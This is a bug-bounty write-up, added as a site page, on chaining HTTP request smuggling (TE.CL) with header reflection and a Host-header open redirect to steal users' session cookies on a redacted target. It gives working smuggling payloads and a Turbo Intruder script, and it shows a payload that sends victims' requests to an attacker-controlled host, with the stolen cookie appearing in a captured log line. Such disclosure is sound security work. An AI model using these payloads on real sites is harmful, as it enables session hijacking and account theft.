@@ -1,0 +1,275 @@
+---
+layout: page
+title: Account takeover via HTTP Request Smuggling
+date: 03/01/2020
+description: A bug chain of HTTP Request Smuggling which allows to obtain an account takeover
+---
+
+<p>This is my second write-up about detecting and exploiting <b>HTTP Request Smuggling</b> by chaining different bugs with it to get critical vulnerabilities, you can find my first write-up here: <a href="http-desync-idor" target="_blank">HTTP Request Smuggling + IDOR</a>.</p>
+
+<p>This time I faced a vulnerable <code>TE.CL</code> system and by chaining an <b>internal header disclosure</b> and an <b>open redirect</b> I was able to get an <b>account takeover</b> of any user.</p>
+
+<p>Everything is redacted and highly modified to not disclose this bug bounty program's information.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#detection">Detection</a>
+    <a class="link-box" href="#header">Internal Header Disclosure</a>
+    <a class="link-box" href="#redirect">Open Redirect</a>
+    <a class="link-box" href="#account">Account Takeover</a>
+</div>
+
+<hr>
+
+<h2 id="detection">Detection</h2>
+
+<p>As in most of these kind of vulnerabilities, everything started thanks to <a href="https://github.com/PortSwigger/http-request-smuggler" target="_blank">Burp's Request Smuggler plugin</a>.</p>
+
+<img class="img-fluid" src="/static/img/bb/http-desync-account-takeover/1.png">
+
+<p>The first thing to do here is confirm if the system is indeed vulnerable.</p>
+
+<p>This time I was facing a supposedly <code>TE.CL</code> vulnerable system, so I used a request like this one to test the behavior.</p>
+
+<pre class="prettyprint">
+POST / HTTP/1.1
+Host: xxx.com
+Content-Length: 4
+Transfer-Encoding : chunked
+
+46
+POST /nothing HTTP/1.1
+Host: xxx.com
+Content-Length: 15
+
+kk
+0
+
+</pre>
+
+<p>If the system is vulnerable, this is what would happen:</p>
+
+<li>The <b>front-end</b> uses the <code>Transfer-Encoding</code> header, therefore sees a chunk of <code>46</code> (hex) characters and a <code>0</code> to determine the end of it. Everything correct so it forwards the request to the back-end.</li>
+
+<li>The <b>back-end</b> uses the <code>Content-Length</code> header instead, which is <code>4</code>, then it only processes the <code>46\r\n</code> characters and returns a <code>200</code> response to this request.</li>
+
+<img class="img-fluid" width="60%" src="/static/img/bb/http-desync-account-takeover/2.png">
+
+<li>The remaining part (<code>POST /nothing...</code>) is processed with the following request received by the back-end.</li>
+
+<li>Therefore, this next request is appended to my request body, and whoever sent it will receive a different response.</li>
+
+<img class="img-fluid" width="60%" src="/static/img/bb/http-desync-account-takeover/3.png">
+
+<p>This behavior can be simulated with the following Turbo Intruder script:</p>
+
+<pre class="prettyprint long">
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=1,
+                           resumeSSL=False,
+                           timeout=10,
+                           pipeline=False,
+                           maxRetriesPerRequest=0,
+                           engine=Engine.THREADED,
+                           )
+    engine.start()
+
+    attack = '''POST / HTTP/1.1
+Host: xxx.com
+Content-Length: 4
+Transfer-Encoding : chunked
+
+46
+POST /nothing HTTP/1.1
+Host: xxx.com
+Content-Length: 15
+
+kk
+0
+
+'''
+    engine.queue(attack)
+
+    victim = '''GET / HTTP/1.1
+Host: xxx.com
+
+'''
+    for i in range(14):
+        engine.queue(victim)
+        time.sleep(0.05)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+</pre>
+
+<p>Which resulted in the following responses.</p>
+
+<p>First, the payload is sent.</p>
+
+<img class="img-fluid" src="/static/img/bb/http-desync-account-takeover/4.png">
+
+<p>A simple <code>GET</code> receives a <code>200</code>.</p>
+
+<img class="img-fluid" src="/static/img/bb/http-desync-account-takeover/5.png">
+
+<p>But the modified request, which should be identical to the others, receives the "malicious" response of <code>/nothing</code>, <code>404</code>.</p>
+
+<img class="img-fluid" src="/static/img/bb/http-desync-account-takeover/6.png">
+
+<p>The vulnerability was confirmed, next I needed to find a way to exploit it.</p>
+
+<h2 id="header">Internal Header Disclosure</h2>
+
+<p>The same site had a login panel which generated the following request when a login attempt occurred.</p>
+
+<pre class="prettyprint">
+POST /login HTTP/1.1
+Host: xxx.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+
+onerror=invalid.html&onsuccess=account.html&username=admin&password=12345
+</pre>
+
+<p>The body data has four parameters, <code>onerror</code> which is the page where the user is redirected if the credentials are invalid, <code>onsuccess</code> when the credentials are valid, <code>username</code> and <code>password</code>.</p>
+
+<p>Making an unsuccessful attempt resulted in a redirection to <code>invalid.html</code>.</p>
+
+<pre class="prettyprint">
+HTTP/1.1 302 Found
+Date: Thu, 2 Jan 2020 20:59:32 GMT
+Content-Type: text/plain
+Connection: close
+Location: http://xxx.com/invalid.html
+Content-Length: 0
+</pre>
+
+<p>Since I was able to control where the redirection was made by changing the <code>onerror</code> value, if I changed the order of the parameters by putting it at the end of the body, I was able to reflect the following request on the response, allowing me to read possible headers being added internally.</p>
+
+<p>The "malicious" request is the following.</p>
+
+<pre class="prettyprint">
+POST / HTTP/1.1
+Host: xxx.com
+Content-Length: 4
+Transfer-Encoding : chunked
+
+AE
+POST /login HTTP/1.1
+Host: xxx.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 300
+
+onsuccess=account.html&username=admin&password=12345&onerror=kk
+0
+
+</pre>
+
+<p>You have to play with the payload <code>Content-Length</code> value in order to retrieve the whole following request.</p>
+
+<p>And this would be expected behavior.</p>
+
+<img class="img-fluid" width="75%" src="/static/img/bb/http-desync-account-takeover/7.png">
+
+<p>Note how even having a newline, the next request (<code>GET /...</code>) is part of the <code>onerror</code> value.</p>
+
+<p>Then, the response of that <code>GET</code> request is the following redirection, where the path contains the full request with its internal headers.</p>
+
+<pre class="prettyprint">
+HTTP/1.1 302 Found
+Date: Thu, 2 Jan 2020 20:59:32 GMT
+Content-Type: text/plain
+Connection: close
+Location: http://xxx.com/<b>kk  0    GET /%20HTTP/1.1%0D%0AHost:%20xxx.com%0D%0AX-Forwarded-For:%20184.173.141.231%0D%0Ax-foo:%20blabla%0D%0A</b>
+Content-Length: 0
+</pre>
+
+<p>In my case I didn't got any important information, just a <code>X-Forwarded-For</code> containing the IP address the request was sent from.</p>
+
+<pre class="prettyprint">
+GET / HTTP/1.1
+Host: xxx.com
+X-Forwarded-For: 184.173.141.231
+x-foo: blabla
+</pre>
+
+<h2 id="redirect">Open Redirect</h2>
+
+<p>Since the Internal Header Disclosure wasn't enough, I tried to look for other ways to exploit the HTTP Request Smuggling and I found the same site was also vulnerable to Host Header poisoning.</p>
+
+<p>This combo allowed me to redirect any user request to a different website just by changing the value of the <code>Host</code> header of my payload.</p> 
+
+<pre class="prettyprint">
+POST / HTTP/1.1
+Host: xxx.com
+Content-Length: 4
+Transfer-Encoding : chunked
+
+BF
+POST /login HTTP/1.1
+Host: <b>malicious.com</b>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+
+onerror=invalid.html&onsuccess=account.html&username=admin&password=12345
+0
+
+</pre>
+
+<p>Then, any request sent just after my payload would receive the following response.</p>
+
+<pre class="prettyprint">
+HTTP/1.1 302 Found
+Date: Thu, 2 Jan 2020 20:59:32 GMT
+Content-Type: text/plain
+Connection: close
+Location: http://<b>malicious.com</b>/invalid.html
+Content-Length: 0
+</pre>
+
+<p>This could already be considered a high severity vulnerability, but it's still possible to upgrade it even more by chaining everything together.</p>
+
+<h2 id="account">Account Takeover</h2>
+
+<p>Using the ability to reflect the next request and the open redirect via the <code>Host</code> header I was able to redirect any user to a website controlled by me and then retrieve every header of the original request by using a payload like the following.</p>
+
+<pre class="prettyprint">
+POST / HTTP/1.1
+Host: xxx.com
+Content-Length: 4
+Transfer-Encoding : chunked
+
+B4
+POST /login HTTP/1.1
+Host: mywebsite.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+onsuccess=account.html&username=admin&password=12345&onerror=kk
+0
+
+</pre>
+
+<p>This is the expected behavior, where any next request gets a redirection to my website.</p>
+
+<img class="img-fluid" width="80%" src="/static/img/bb/http-desync-account-takeover/8.png">
+
+<p>Then I just needed to launch the payload till the next request was from an authenticated user and then something like this would appear in my server log.</p>
+
+<pre class="prettyprint">
+69.65.13.216 - - [02/Jan/2020 21:02:16] "GET /kk%20%200%20%20%20%20GET%20/document/2%20HTTP/1.1%0D0AHost:%20xxx.com%0D0ACookie:%20session=d2104a400c7f629a197f33bb33fe80c0%0D0AX-Forwarded-For:%2069.65.13.216%0D0Ax-foo:%20blabla%0D%0A HTTP/1.1" 404 -
+</pre>
+
+<p>Being able to retrieve the original request and steal this user session.</p>
+
+<pre class="prettyprint">
+GET /document/2 HTTP/1.1
+Host: xxx.com
+Cookie: <b>session=d2104a400c7f629a197f33bb33fe80c0</b>
+X-Forwarded-For: 69.65.13.216
+x-foo: blabla
+</pre>
+
+<p>I could also make my website redirect the user to the original website which would make the attack almost imperceptible to the victim.</p>
